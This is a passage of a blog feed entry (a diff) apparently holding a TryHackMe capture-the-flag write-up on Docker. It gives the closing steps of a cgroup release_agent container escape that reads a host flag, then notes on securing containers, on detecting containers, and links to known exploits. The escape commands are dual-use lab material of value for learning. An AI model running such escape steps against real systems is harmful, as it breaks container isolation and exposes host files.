+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;cat /home/cmnatic/flag.txt &amp;gt; $host_path/flag.txt&quot; &amp;gt;&amp;gt; /exploit&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;execute a command to echo the host flag into a file named “flag.txt” in the container, once “/exploit” is executed&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod a+x /exploit&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;make the exploit executable&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh -c &quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&quot;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;create a process and store that into “/tmp/cgrp/x/cgroup.procs”&lt;/li&gt;
+  &lt;li&gt;Explore the host OS&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Task Question:&lt;/p&gt;
+
+&lt;p&gt;Contents of “flag.txt” from the host operating system&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;thm{y&lt;strong&gt;**&lt;/strong&gt;&lt;strong&gt;**&lt;/strong&gt;&lt;strong&gt;**&lt;/strong&gt;**s}&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;task-12---securing-your-container&quot;&gt;Task 12 - Securing Your Container&lt;/h2&gt;
+&lt;p&gt;Principle of Least Privilege:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Commands in docker run as root unless told otherwise&lt;/li&gt;
+  &lt;li&gt;Give your image the least amount of privileges needed to run
+Docker Seccomp 101:&lt;/li&gt;
+  &lt;li&gt;“Secure Computing” is a feature of the linux kernel&lt;/li&gt;
+  &lt;li&gt;Docker uses security profiles for containers&lt;/li&gt;
+  &lt;li&gt;Can deny actions such as using the mount namespace or any of the Linux system calls
+Securing Your Daemon:&lt;/li&gt;
+  &lt;li&gt;In later docker installs, running a registry relies on a self-signed SSL certificate behind a webserver&lt;/li&gt;
+  &lt;li&gt;Certificates must be distributed and trusted on every device interacting with the container&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;task-13---determining-if-youre-in-a-container&quot;&gt;Task 13 - Determining if you’re in a Container&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Containers have fewer processes running than the host OS&lt;/li&gt;
+  &lt;li&gt;use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps aux&lt;/code&gt; to view running processes&lt;/li&gt;
+  &lt;li&gt;Look for the .dockerenv file&lt;/li&gt;
+  &lt;li&gt;Located in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; directory&lt;/li&gt;
+  &lt;li&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd / &amp;amp;&amp;amp; ls -lah&lt;/code&gt; to view hidden files and folders&lt;/li&gt;
+  &lt;li&gt;Cgroups are used by containerization software such as Docker or LXC.&lt;/li&gt;
+  &lt;li&gt;Look for cgroups by going to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/1&lt;/code&gt; and catting the cgroups file&lt;/li&gt;
+  &lt;li&gt;The cgroups file contains paths including the word docker&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;task-14---additional-material&quot;&gt;Task 14 - Additional Material&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/dirtycow/dirtycow.github.io&quot;&gt;Dirty Cow Exploit&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/&quot;&gt;Exploiting runC (CVE-2019-5736)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.&quot;&gt;Trailofbits’ capabilities demonstration&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.google.com/presentation/d/1WdByuxWgayPb-RstO-XaENSqVPGP7h6t3GS6W4jk4tk/htmlpresent&quot;&gt;Cgroups 101&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="THM" /><category term="CTF" /><category term="Docker" /><summary type="html">Subscriber Room</summary></entry></feed>
